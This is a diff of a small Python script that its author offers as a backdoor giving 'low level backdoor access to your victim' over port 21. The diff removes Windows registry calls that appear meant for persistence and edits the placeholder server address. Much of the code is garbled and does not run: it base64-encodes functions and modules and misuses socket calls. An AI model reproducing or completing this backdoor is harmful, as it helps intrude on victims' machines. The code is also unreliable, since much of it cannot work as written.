@@ -1,5 +1,4 @@
 import socket
-import winreg
 import base64
 import os
 import time
@@ -20,17 +19,14 @@ base64.standard_b64encode(protocol=0)
 base64.standard_b64encode(socket.listen)
 base64.standard_b64encode(socket.recv)
 base64.standard_b64encode(socket.send)
-base64.standard_b64encode(winreg.CreateKey)
-base64.standard_b64encode(winreg.SetValueEx)
 base64.standard_b64encode(base64.standard_b64encode)
-base64.standard_b64encode(winreg)
 base64.standard_b64encode(socket.accept)
 
 
 socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM, protocol=0)
 host = socket.gethostname()
 port = 21
-server = 'YOUR IP'
+server = 'your ipv4'
 addr = socket.bind(server, port)
 socket.connect(addr)
 
@@ -42,7 +38,7 @@ while True:
 
 """
 Now you could check who is connecting to you on port 21 and use netcat to connect to your victim or use ftp to connect to them.
-once you do that you have low level backdoor access to your victim
+once you do that you have low level backdoor access to your victim. Note that it's not fully finished
 
 by: Rtgamer8387
 """
